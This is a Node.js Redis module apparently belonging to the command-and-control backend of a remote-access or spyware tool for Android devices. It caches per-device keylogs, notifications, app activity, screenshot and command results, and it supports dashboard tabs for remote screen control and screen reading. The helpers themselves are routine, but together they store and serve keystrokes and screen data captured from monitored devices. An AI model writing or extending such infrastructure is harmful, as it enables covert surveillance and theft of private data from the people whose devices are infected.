'use strict';

/**
 * REDIS CLIENT
 * Connects to REDIS_URL, flushes stale cache on startup,
 * and exposes typed helpers used throughout server.js.
 */

const Redis = require('ioredis');

// ── TTLs ─────────────────────────────────────────────────────────────────────
const TTL = {
    device:       3600 * 24 * 7,  // 7 days   – device info
    notifications: 3600 * 24,     // 24 hours – per-device notifications
    activity:      3600 * 6,      // 6 hours  – per-device activity
    keylogs:       3600 * 24,     // 24 hours – per-device keylogs
    command:       3600,          // 1 hour   – command result cache
};

// ── Caps ─────────────────────────────────────────────────────────────────────
const CAP = {
    notifications: 200,
    activity:      100,
    keylogs:       500,
};

// ── Key helpers ───────────────────────────────────────────────────────────────
const K = {
    device:         (id)  => `device:${id}`,
    deviceOnline:   ()    => 'devices:online',            // SET of online deviceIds
    deviceList:     ()    => 'devices:all',               // SET of all known deviceIds
    notifications:  (id)  => `notifications:${id}`,      // LIST
    activity:       (id)  => `activity:${id}`,            // LIST
    keylogs:        (id)  => `keylogs:${id}`,             // LIST
    command:        (cid) => `command:${cid}`,            // HASH
};

let redis = null;
let connected = false;

function log(msg, level = 'info') {
    const ts = new Date().toISOString().slice(11, 23);
    const fn = level === 'error' ? console.error : level === 'warn' ? console.warn : console.log;
    fn(`[${ts}][REDIS] ${msg}`);
}

/**
 * Initialise the Redis client.
 * Call once at server startup — returns a Promise that resolves when ready.
 */
async function init() {
    const url = process.env.REDIS_URL;
    if (!url) {
        log('REDIS_URL not set — Redis disabled (running in-memory only)', 'warn');
        return;
    }

    return new Promise((resolve) => {
        redis = new Redis(url, {
            maxRetriesPerRequest: 3,
            enableReadyCheck: true,
            retryStrategy(times) {
                if (times > 5) {
                    log(`Giving up reconnect after ${times} attempts`, 'warn');
                    return null;
                }
                const delay = Math.min(times * 500, 3000);
                log(`Reconnecting in ${delay}ms (attempt ${times})…`);
                return delay;
            },
            lazyConnect: false,
        });

        redis.on('connect', () => log('TCP connection established'));
        redis.on('ready',   async () => {
            connected = true;
            log(`Connected to Redis — flushing stale cache (FLUSHALL)…`);
            try {
                await redis.flushall();
                log('Cache flushed — clean start');
            } catch (e) {
                log(`flushall error: ${e.message}`, 'warn');
            }
            resolve();
        });
        redis.on('error',  (e)  => log(`Error: ${e.message}`, 'error'));
        redis.on('close',  ()   => { connected = false; log('Connection closed', 'warn'); });
        redis.on('reconnecting', (ms) => log(`Reconnecting in ${ms}ms…`));

        setTimeout(resolve, 5000);  // don't block server startup indefinitely
    });
}

/** Whether Redis is currently usable */
function isConnected() { return connected && redis !== null; }

/** Raw client (for advanced usage) */
function client() { return redis; }

// ── Device helpers ────────────────────────────────────────────────────────────

async function saveDevice(deviceId, info) {
    if (!isConnected()) return;
    try {
        const key = K.device(deviceId);
        const payload = typeof info === 'string' ? info : JSON.stringify(info);
        await redis.setex(key, TTL.device, payload);
        await redis.sadd(K.deviceList(), deviceId);
        if (info.isOnline) {
            await redis.sadd(K.deviceOnline(), deviceId);
        } else {
            await redis.srem(K.deviceOnline(), deviceId);
        }
    } catch (e) {
        log(`saveDevice error: ${e.message}`, 'warn');
    }
}

async function getDevice(deviceId) {
    if (!isConnected()) return null;
    try {
        const raw = await redis.get(K.device(deviceId));
        return raw ? JSON.parse(raw) : null;
    } catch (e) {
        log(`getDevice error: ${e.message}`, 'warn');
        return null;
    }
}

async function getAllDevices() {
    if (!isConnected()) return [];
    try {
        const ids = await redis.smembers(K.deviceList());
        if (!ids.length) return [];
        const pipeline = redis.pipeline();
        ids.forEach(id => pipeline.get(K.device(id)));
        const results = await pipeline.exec();
        return results
            .map(([err, val]) => (!err && val ? JSON.parse(val) : null))
            .filter(Boolean);
    } catch (e) {
        log(`getAllDevices error: ${e.message}`, 'warn');
        return [];
    }
}

async function markDeviceOnline(deviceId) {
    if (!isConnected()) return;
    try {
        await redis.sadd(K.deviceOnline(), deviceId);
        const raw = await redis.get(K.device(deviceId));
        if (raw) {
            const d = JSON.parse(raw);
            d.isOnline = true;
            d.lastSeen = new Date().toISOString();
            await redis.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
        }
    } catch (e) {
        log(`markDeviceOnline error: ${e.message}`, 'warn');
    }
}

async function markDeviceOffline(deviceId) {
    if (!isConnected()) return;
    try {
        await redis.srem(K.deviceOnline(), deviceId);
        const raw = await redis.get(K.device(deviceId));
        if (raw) {
            const d = JSON.parse(raw);
            d.isOnline = false;
            d.lastSeen = new Date().toISOString();
            await redis.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
        }
    } catch (e) {
        log(`markDeviceOffline error: ${e.message}`, 'warn');
    }
}

// ── Notification helpers ──────────────────────────────────────────────────────

async function pushNotification(deviceId, entry) {
    if (!isConnected()) return;
    try {
        const key = K.notifications(deviceId);
        await redis.lpush(key, JSON.stringify(entry));
        await redis.ltrim(key, 0, CAP.notifications - 1);
        await redis.expire(key, TTL.notifications);
    } catch (e) {
        log(`pushNotification error: ${e.message}`, 'warn');
    }
}

async function getNotifications(deviceId) {
    if (!isConnected()) return [];
    try {
        const items = await redis.lrange(K.notifications(deviceId), 0, -1);
        return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
    } catch (e) {
        log(`getNotifications error: ${e.message}`, 'warn');
        return [];
    }
}

// ── Activity helpers ──────────────────────────────────────────────────────────

async function pushActivity(deviceId, entry) {
    if (!isConnected()) return;
    try {
        const key = K.activity(deviceId);
        // Dedupe consecutive same-app entries
        const latest = await redis.lindex(key, 0);
        if (latest) {
            const prev = JSON.parse(latest);
            if (prev.packageName === entry.packageName) return;
        }
        await redis.lpush(key, JSON.stringify(entry));
        await redis.ltrim(key, 0, CAP.activity - 1);
        await redis.expire(key, TTL.activity);
    } catch (e) {
        log(`pushActivity error: ${e.message}`, 'warn');
    }
}

async function getActivity(deviceId) {
    if (!isConnected()) return [];
    try {
        const items = await redis.lrange(K.activity(deviceId), 0, -1);
        return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
    } catch (e) {
        log(`getActivity error: ${e.message}`, 'warn');
        return [];
    }
}

// ── Keylog helpers ────────────────────────────────────────────────────────────

async function pushKeylog(deviceId, entry) {
    if (!isConnected()) return;
    try {
        const key = K.keylogs(deviceId);
        await redis.lpush(key, JSON.stringify(entry));
        await redis.ltrim(key, 0, CAP.keylogs - 1);
        await redis.expire(key, TTL.keylogs);
    } catch (e) {
        log(`pushKeylog error: ${e.message}`, 'warn');
    }
}

async function getKeylogs(deviceId) {
    if (!isConnected()) return [];
    try {
        const items = await redis.lrange(K.keylogs(deviceId), 0, -1);
        return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
    } catch (e) {
        log(`getKeylogs error: ${e.message}`, 'warn');
        return [];
    }
}

// ── Command cache helpers ─────────────────────────────────────────────────────

async function cacheCommandResult(commandId, result) {
    if (!isConnected()) return;
    try {
        await redis.setex(K.command(commandId), TTL.command, JSON.stringify(result));
    } catch (e) {
        log(`cacheCommandResult error: ${e.message}`, 'warn');
    }
}

async function getCachedCommandResult(commandId) {
    if (!isConnected()) return null;
    try {
        const raw = await redis.get(K.command(commandId));
        return raw ? JSON.parse(raw) : null;
    } catch (e) {
        log(`getCachedCommandResult error: ${e.message}`, 'warn');
        return null;
    }
}

// ── Stats ─────────────────────────────────────────────────────────────────────

async function getStats() {
    if (!isConnected()) return { connected: false };
    try {
        const info = await redis.info('stats');
        const onlineCount = await redis.scard(K.deviceOnline());
        const totalCount  = await redis.scard(K.deviceList());
        const memLine     = (await redis.info('memory')).split('\n').find(l => l.startsWith('used_memory_human'));
        const memUsed     = memLine ? memLine.split(':')[1].trim() : 'unknown';
        return { connected: true, onlineDevices: onlineCount, totalDevices: totalCount, memoryUsed: memUsed };
    } catch (e) {
        return { connected: false, error: e.message };
    }
}

// ── Session reset helper ──────────────────────────────────────────────────────

/**
 * Delete all command:* cache keys from Redis.
 * Called when the dashboard refreshes on ScreenControl or ScreenReader tab so
 * stale command results, pending frame requests, and screenshot blobs don't
 * linger in the cache between sessions.
 */
async function clearCommandCache() {
    if (!isConnected()) return 0;
    try {
        let cursor = '0';
        let deleted = 0;
        do {
            const [nextCursor, keys] = await redis.scan(cursor, 'MATCH', 'command:*', 'COUNT', 200);
            cursor = nextCursor;
            if (keys.length) {
                await redis.del(...keys);
                deleted += keys.length;
            }
        } while (cursor !== '0');
        log(`clearCommandCache: removed ${deleted} command cache key(s)`);
        return deleted;
    } catch (e) {
        log(`clearCommandCache error: ${e.message}`, 'warn');
        return 0;
    }
}

// ── Graceful shutdown ─────────────────────────────────────────────────────────

async function quit() {
    if (redis) {
        try { await redis.quit(); log('Disconnected gracefully'); }
        catch (e) { redis.disconnect(); }
    }
}

module.exports = {
    init, isConnected, client, quit, getStats,
    saveDevice, getDevice, getAllDevices, markDeviceOnline, markDeviceOffline,
    pushNotification, getNotifications,
    pushActivity, getActivity,
    pushKeylog, getKeylogs,
    cacheCommandResult, getCachedCommandResult,
    clearCommandCache,
};
